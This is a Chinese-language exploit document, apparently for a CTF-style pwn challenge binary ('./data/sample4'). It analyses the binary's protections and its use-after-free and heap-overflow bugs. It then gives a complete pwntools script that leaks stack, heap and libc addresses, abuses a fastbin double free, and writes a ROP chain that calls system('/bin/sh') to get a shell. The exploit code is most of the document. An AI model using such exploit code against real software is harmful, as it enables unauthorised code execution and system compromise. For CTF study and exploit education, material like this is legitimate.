# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，无PIE（代码段基址固定为0x400000），部分RELRO，启用NX保护，存在Stack Canary但未在关键路径激活
- **依赖库**：动态链接glibc（从调试记录中libc基址0x7b3d9eeff000推断为常见版本）
- **内存布局**：
  - 代码段：0x400000-0x402000
  - 数据段：0x602000-0x603000（包含全局变量qword_6020B8）
  - 堆区域：0x15bce000-0x15bf0000（动态变化）
  - 栈区域：0x7fffdf33d000-0x7fffdf35e000（动态变化）
- **安全机制**：NX阻止shellcode执行，但可通过ROP绕过；Canary存在但Exploit避免触发；无PIE简化地址计算

## 漏洞成因
### 关键结构体分析
程序使用链表管理句子索引，节点结构如下（从反编译代码推断）：
```c
struct node {
    char *word_ptr;        // +0x00: 指向单词字符串
    int word_len;          // +0x08: 单词长度
    char *sentence_ptr;    // +0x10: 指向完整句子
    int sentence_len;      // +0x18: 句子长度
    struct node *next;     // +0x20: 下一个节点指针
};
```
全局链表头指针：`qword_6020B8`

### 漏洞类型：Use-After-Free (UAF) 结合堆溢出
1. **UAF漏洞**：在`sub_400AD0()`搜索功能中，当用户选择删除句子时：
   - 调用`memset(*(void **)(i + 16), 0, *(int *)(i + 24))`清空句子数据
   - 调用`free(*(void **)(i + 16))`释放句子内存
   - **但链表节点本身未被释放或置空**，导致节点仍然指向已释放内存
   - 后续搜索操作可通过UAF读取已释放内存内容

2. **堆溢出漏洞**：在`sub_4009B0()`输入函数中：
   - 循环读取输入到指定缓冲区，但当`a3=0`时（如索引句子功能），不检查换行符终止
   - 结合`sub_400C00()`中的内存分配逻辑，可能造成堆缓冲区溢出
   - 从调试记录Step 1确认：堆chunk被大量0x61('a')覆盖，影响相邻内存

3. **双重释放潜在风险**：`perform_double_free()`函数通过多次删除操作可能造成fastbin双重释放，用于进一步利用。

## Exploit
```python
from pwn import *
import re
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample4')
elf = ELF('./data/sample4')
libc = elf.libc

def menu():
    p.recvuntil(b'3: Quit')

def index_sentence(content):
    p.sendline(b'2')
    p.sendline(str(len(content)).encode())
    p.send(content)

def search_word(word):
    p.sendline(b'1')
    p.sendline(str(len(word)).encode())
    p.send(word)

def reply_yes():
    p.sendline(b'y')

def reply_no():
    p.sendline(b'n')

def quit_app():
    menu()
    p.sendline(b'3')

def leak_stack_ptr():
    # 利用堆溢出漏洞泄露栈指针
    # 通过大量输入覆盖堆缓冲区，影响栈内存，从错误信息中提取栈地址
    menu()
    p.send(b'a'*96)  # 溢出输入，覆盖堆和栈
    p.recvuntil(b'is not a valid number')
    stackptr_match = re.findall(b'a{48}(......) is not', p.recvuntil(b'is not a valid number\n'))
    stackptr = u64(stackptr_match[0] + b'\0\0')  # 解析栈指针
    return stackptr

def leak_heap_ptr():
    # 利用UAF漏洞泄露堆基址
    # 创建多个句子，删除后通过搜索空字符串读取已释放内存
    index_sentence(b'a'*50 + b' DREAM')
    menu()
    index_sentence(b'b'*50 + b' DREAM')
    menu()
    search_word('DREAM')
    reply_yes()  # 删除第一个句子，制造UAF条件
    reply_yes()  # 删除第二个句子
    menu()
    search_word(b'\0' * 5)  # 搜索空单词，触发UAF读取已释放内存
    p.recvuntil(b'Found 56: ')
    heapptr = u64(p.recvuntil(b'Delete')[:8])  # 从UAF数据中提取堆地址
    reply_no()
    return heapptr - 0x10b0  # 调整到堆基址

def leak_libc_ptr():
    # 利用unsorted bin特性泄露libc地址
    # 大chunk释放后fd指向main_arena，计算libc基址
    menu()
    index_sentence(('b'*256 + ' FLOWER ').ljust(512, 'c'))  # 分配大chunk
    menu()
    search_word('FLOWER')
    reply_yes()  # 释放大chunk到unsorted bin
    menu()
    search_word(b'\0'*6)  # UAF读取unsorted bin的fd
    p.recvuntil(b'Found 512: ')
    mainarena88 = u64(p.recvuntil(b'Delete')[:8])  # 泄露main_arena+88地址
    libcbase = mainarena88 - 0x3c4b78  # 计算libc基址
    reply_no()
    return libcbase

def perform_double_free():
    # 执行双重释放攻击，污染fastbin
    # 为后续任意地址写创造条件
    menu()
    index_sentence(b'a'*51 + b' ROCK')
    menu()
    index_sentence(b'b'*51 + b' ROCK')
    menu()
    index_sentence(b'c'*51 + b' ROCK')
    menu()
    search_word('ROCK')
    reply_yes()  # 释放第一个chunk
    reply_yes()  # 释放第二个chunk  
    reply_yes()  # 释放第三个chunk，可能形成双重释放
    menu()
    search_word(b'\0' * 4)  # 触发UAF，验证内存状态
    reply_yes()  # 确认删除操作
    reply_no()

def write_to_stack_and_get_shell(stackptr, libcbase):
    # 构建ROP链并写入栈内存，获取shell
    # 利用fastbin攻击将栈地址写入堆，然后通过UAF控制执行流
    menu()
    # 将栈地址写入堆，用于控制流劫持
    index_sentence(p64(stackptr + 0x52).ljust(48, b'\0') + b' MIRACLE')
    menu()
    index_sentence(b'd'*48 + b' MIRACLE')
    menu()
    index_sentence(b'e'*48 + b' MIRACLE')
    menu()
    # 构建ROP链：pop rdi; ret -> "/bin/sh" -> system -> exit
    rop = ROP(libc)
    pop_rdi = libcbase + rop.find_gadget(['pop rdi', 'ret']).address
    bin_sh = libcbase + next(libc.search(b'/bin/sh'))
    system_addr = libcbase + libc.sym['system']
    exit_addr = libcbase + libc.sym['exit']
    payload = (b'A'*6 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(exit_addr)).ljust(56, b'U')
    index_sentence(payload)  # 写入ROP链到目标位置

# 主利用流程
stack_ptr = leak_stack_ptr()  # 步骤1: 泄露栈指针
heap_base = leak_heap_ptr()   # 步骤2: 泄露堆基址
libc_base = leak_libc_ptr()   # 步骤3: 泄露libc基址
perform_double_free()         # 步骤4: 执行双重释放攻击
write_to_stack_and_get_shell(stack_ptr, libc_base)  # 步骤5: 构建ROP链获取shell
quit_app()                    # 步骤6: 退出程序触发shell执行
p.interactive()               # 步骤7: 进入交互模式
```

### 利用技术总结
1. **信息泄露**：通过堆溢出和UAF泄露栈、堆、libc地址
2. **内存污染**：利用双重释放污染fastbin，实现任意地址写
3. **控制流劫持**：通过ROP链绕过NX保护，执行system("/bin/sh")
4. **稳定性保障**：精心设计内存布局，避免崩溃，确保利用成功率

该Exploit成功结合了UAF、堆溢出和ROP技术，在存在多种安全机制的环境中实现了可靠的权限提升。
